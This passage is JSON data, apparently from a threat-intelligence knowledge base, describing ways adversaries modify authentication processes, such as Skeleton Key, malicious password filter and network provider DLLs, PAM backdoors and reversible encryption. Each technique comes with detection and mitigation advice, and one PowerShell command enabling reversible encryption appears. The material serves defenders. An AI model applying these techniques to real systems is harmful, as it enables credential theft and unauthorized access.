and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>\n\nLimit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities.\n\nLimit on-premises accounts with access to the hybrid identity solution in place. For example, limit Azure AD Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>. \n\nStarting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Review authentication logs to ensure that mechanisms such as enforcement of MFA are functioning as intended.\n\nPeriodically review the hybrid identity solution in use for any discrepancies. For example, review all Pass Through Authentication (PTA) agents in the Azure Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nPeriodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>). Ensure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}],"subTechniques":[{"id":"T1556.001","name":"Domain Controller Authentication","description":"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \n\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments. <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>","detection":"Monitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Creation","Process: Process Access","File: File Modification","Process: OS API Execution"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to recognize and handle suspicious email attachments. Emphasize the importance of caution when opening attachments from unknown or unexpected sources, even if they appear legitimate. Implement email warning banners to alert users about emails originating from outside the organization or containing attachments, reinforcing awareness and helping users identify potential spearphishing attempts."},{"id":"M1025","name":"Privileged Process Integrity","description":"Enabled features, such as Protected Process Light (PPL), for LSA. <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1556.002","name":"Password Filter DLL","description":"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. <a href=\"http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carnal Ownage Password Filters Sept 2013)</a>","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (C:\\Windows\\System32\\ by default) of a domain controller and/or local computer with a corresponding entry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages."}]},{"id":"T1556.003","name":"Pluggable Authentication Modules","description":"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>. <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a> <a href=\"https://linux.die.net/man/8/pam_unix\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Man Pam_Unix)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Hat PAM)</a>\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials. <a href=\"https://github.com/zephrax/linux-pam-backdoor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Backdoor)</a>\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords. <a href=\"https://x-c3ll.github.io/posts/PAM-backdoor-DNS/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAM Creds)</a> <a href=\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple PAM)</a>","detection":"Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Linux","macOS"],"dataSources":["File: File Modification","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from modifying PAM components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information."}]},{"id":"T1556.004","name":"Network Device Authentication","description":"Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials. <a href=\"https://www.mandiant.com/resources/synful-knock-acis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant - Synful Knock)</a>","detection":"Consider verifying the checksum of the operating system file and verifying the image of the operating system in memory. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>\n\nDetection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.","platforms":["Network Devices"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"}]},{"id":"T1556.005","name":"Reversible Encryption","description":"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value. <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_1)</a> <a href=\"http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: how_pwd_rev_enc_2)</a>\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a> In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.","detection":"Monitor property changes in Group Policy: <code>Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption</code>. By default, the property should be set to Disabled.\n\nMonitor command-line usage for <code>-AllowReversiblePasswordEncryption $true</code> or other actions that could be related to malicious tampering of user settings (i.e. Group Policy Modification). Furthermore, consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such as <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>, that change account configurations. \n\nMonitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Object Modification","Command: Command Execution","User Account: User Account Metadata","Script: Script Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that <code>AllowReversiblePasswordEncryption</code> property is set to disabled unless there are application requirements. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: store_pwd_rev_enc)</a>"}]},{"id":"T1556.006","name":"Multi-Factor Authentication","description":"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality. <a href=\"https://www.mandiant.com/media/17826\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT42)</a> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/governance/conditional-access-exclusion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Conditional Access Exclusions)</a>\n\nFor example, modifying the Windows hosts file (<code>C:\\windows\\system32\\drivers\\etc\\hosts</code>) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a> \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)</a>","detection":"","platforms":["IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","Application Log: Application Log Content","Active Directory: Active Directory Object Modification","User Account: User Account Authentication","User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that proper policies are implemented to dictate the secure enrollment and deactivation of MFA for user accounts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Ensure that MFA and MFA policies and requirements are properly implemented for existing and deactivated or dormant accounts and devices. If possible, consider configuring MFA solutions to \"fail closed\" rather than grant access in case of serious errors."},{"id":"M1047","name":"Audit","description":"Review MFA actions alongside authentication logs to ensure that MFA-based logins are functioning as intended. Review user accounts to ensure that all accounts have MFA enabled. <a href=\"https://www.mandiant.com/resources/blog/cloud-bad-log-configurations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Cloudy Logs 2023)</a>"}]},{"id":"T1556.007","name":"Hybrid Identity","description":"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Hybrid Identity)</a>:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the <code>AzureADConnectAuthenticationAgentService</code> process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. <a href=\"https://blog.xpnsec.com/azuread-connect-for-redteam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure AD Connect for Read Teamers)</a> <a href=\"https://o365blog.com/post/on-prem_admin/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AADInternals Azure AD On-Prem to Cloud)</a> In environments using AD FS, an adversary may edit the <code>Microsoft.IdentityServer.Servicehost</code> configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a>","detection":"","platforms":["IaaS","Identity Provider","Office Suite","SaaS","Windows"],"dataSources":["File: File Modification","Module: Module Load","Application Log: Application Log Content","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit on-premises accounts with access to the hybrid identity solution in place. For example, limit Entra ID Global Administrator accounts to only those required, and ensure that these are dedicated cloud-only accounts rather than hybrid ones. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."},{"id":"M1047","name":"Audit","description":"Periodically review the hybrid identity solution in use for any discrepancies. For example, review all PTA agents in the Entra ID Management Portal to identify any unwanted or unapproved ones. <a href=\"https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure AD Backdoors)</a> If ADFS is in use, review DLLs and executable files in the AD FS and Global Assembly Cache directories to ensure that they are signed by Microsoft. Note that in some cases binaries may be catalog-signed, which may cause the file to appear unsigned when viewing file properties. <a href=\"https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MagicWeb)</a>"}]},{"id":"T1556.008","name":"Network Provider DLL","description":"Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. <a href=\"https://learn.microsoft.com/en-us/windows/win32/secauthn/network-provider-api\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Network Provider API)</a> During the logon process, Winlogon (the interactive logon module) sends credentials to the local <code>mpnotify.exe</code> process via RPC. The <code>mpnotify.exe</code> process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a> <a href=\"https://www.youtube.com/watch?v=ggY3srD9dYs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY Video)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a> \n\nAdversaries can configure a malicious network provider DLL to receive credentials from <code>mpnotify.exe</code>. <a href=\"https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY)</a> Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the <code>NPLogonNotify()</code> function. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/npapi/nf-npapi-nplogonnotify\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPLogonNotify)</a>\n\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers. <a href=\"https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NPPSPY - Huntress)</a>","detection":"","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification","Process: OS API Execution","File: File Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Restrict Registry permissions to disallow the modification of sensitive Registry keys such as <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>."},{"id":"M1028","name":"Operating System Configuration","description":"Starting in Windows 11 22H2, the <code>EnableMPRNotifications</code> policy can be disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers. <a href=\"https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowslogon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EnableMPRNotifications)</a>"},{"id":"M1047","name":"Audit","description":"Periodically review for new and unknown network provider DLLs within the Registry (<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider\\ProviderPath</code>).\n\nEnsure only valid network provider DLLs are registered. The name of these can be found in the Registry key at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order</code>, and have corresponding service subkey pointing to a DLL at <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentC ontrolSet\\Services\\&lt;NetworkProviderName&gt;\\NetworkProvider</code>."}]},{"id":"T1556.009","name":"Conditional Access Policies","description":"Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Conditional Access)</a> <a href=\"https://jumpcloud.com/support/get-started-conditional-access-policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: JumpCloud Conditional Access Policies)</a> <a href=\"https://support.okta.com/help/s/article/Conditional-access-based-on-device-security-posture?language=en_US\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta Conditional Access Policies)</a> In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain <code>condition</code> attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS IAM Conditions)</a> <a href=\"https://cloud.google.com/iam/docs/conditions-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP IAM Conditions)</a> These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.","detection":"","platforms":["IaaS","Identity Provider"],"dataSources":["Active Directory: Active Directory Object Modification","Cloud Service: Cloud Service Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit permissions to modify conditional access policies to only those 